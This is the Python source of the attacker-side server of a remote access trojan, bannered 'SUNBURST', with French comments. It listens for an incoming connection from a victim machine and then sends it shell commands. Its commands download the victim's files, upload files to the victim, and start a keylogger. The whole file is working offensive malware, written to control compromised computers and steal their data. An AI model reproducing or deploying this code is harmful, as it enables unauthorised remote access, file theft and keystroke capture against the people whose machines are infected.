import socket
import json
import base64
import os

banner = ("================= SUNBURST ================= \n"
          "              By b64-Sm9yZGFuIExBSVJFUw               \n"
	  "============================================")

prompt = "[SUNBURST] ==> "

def envoi(data):
	json_data = json.dumps(data)
	cible.send(json_data)

def reception():
	data = ""
	while True:
		try:
			data = data + cible.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def shell():
	global numeroScreen
	while True:
		commande = raw_input(prompt+"[SUNBURSTED: " + str(ip) + "] >>> ")
		envoi(commande)
		if commande == "quit":
			break
		elif commande[:2] == "cd" and len(commande)>1:
			continue
		elif commande[:8] == "download":
			with open(commande[9:], "wb") as fichier:
				data = reception()
				fichier.write(base64.b64decode(data))
		elif commande[:6] == "upload":
			try:
				with open(commande[7:], "rb") as fichier:
					envoi(base64.b64encode(fichier.read()))
			except:
				message = prompt+"L'upload a echoue."
				envoi(base64.b64encode(message))
		elif commande[:12] == "keylog_start":
			continue
		else:
			resultat = reception()
			print(resultat)

def serveur():
	global s, ip, cible
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	# INSCRIRE L'IP DE LA CIBLE
	s.bind(("255.255.255.255",54321))
	s.listen(5)
	print(prompt+"Attente d'une cible...")
	cible, ip = s.accept()

os.system("clear")
print(banner+"\n")
serveur()
shell()
